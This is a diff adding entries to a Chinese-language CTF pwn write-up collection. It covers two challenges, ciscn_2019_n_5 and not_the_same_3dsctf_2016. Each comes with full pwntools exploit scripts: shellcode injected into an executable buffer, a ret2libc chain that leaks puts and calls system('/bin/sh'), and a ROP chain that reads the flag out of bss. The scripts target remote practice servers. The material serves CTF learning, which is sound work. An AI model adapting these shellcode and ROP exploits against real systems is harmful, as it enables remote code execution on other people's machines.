@@ -495,3 +495,101 @@ p.interactive()
 
 
 
+## 17 ciscn_2019_n_5
+
+有两种做法，第一种应该是题目的原意，但是我的ubuntu版本比较高，出现了一些问题，就直接当作`ret2libc`来写了
+
+第一种：
+
+因为第一次输入name的地方很大并且可执行，所以写入`shellcode`，然后跳转到name的地址就好
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',25442)
+def dbg():
+    gdb.attach(p)
+    pause()
+
+shellcode = asm(shellcraft.sh())
+p.recvuntil(b'name\n')
+p.sendline(shellcode)
+p.recvuntil('me?\n')
+payload = b'a'*0x20+b'a'*0x8+p64(0x601080)
+p.sendline(payload)
+p.interactive()
+```
+
+第二种：
+
+直接当作`ret2libc`来写，第二次的时候可以先把`/bin/sh`写入name中，然后调用name里的，记得先`ret`对齐一下
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',25442)
+def dbg():
+    gdb.attach(p)
+    pause()
+puts_got = elf.got['puts']
+puts_plt=elf.plt['puts']
+main = elf.sym['main']
+pop_rdi = 0x400713
+ret = 0x00000000004004c9
+
+p.recvuntil('name\n')
+p.sendline(b'a')
+p.recvuntil('me?\n')
+payload = b'a'*0x20+b'b'*0x8+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(main)
+p.sendline(payload)
+puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
+libc = LibcSearcher('puts',puts_addr)
+libc_base = puts_addr-libc.dump('puts')
+log.info("libc_base:"+hex(libc_base))
+
+system = libc_base+libc.dump('system')
+p.sendafter(b'name\n', b'/bin/sh\x00')
+payload =b'a'*(0x20 +8) +p64(ret) +p64(pop_rdi) +p64(0x601080) +p64(system)
+
+p.sendlineafter(b'me?\n',payload)
+p.interactive()
+```
+
+*LibcSearcher选择第6个*
+
+## 18 not_the_same_3dsctf_2016
+
+ida里面可以看到，在main函数上面的`get_secret`函数将`flag.txt`里的内容读入到了`bss`段，那么可以用`write`函数将其打印出来
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+#p = process('./pwn')
+p = remote('node5.buuoj.cn',27329)
+def dbg():
+    gdb.attach(p)
+    pause()
+write_addr = elf.sym['write']
+flag = 0x80ECA2D
+payload = b'a'*45+p32(0x80489A0)+p32(write_addr)+p32(0)+p32(1)+p32(flag)+p32(42)
+# 填充+读取flag函数跳转+write函数调用+write返回后的地址+fd参数+flag地址+输出字节数
+p.sendline(payload)
+p.interactive()
+```
+
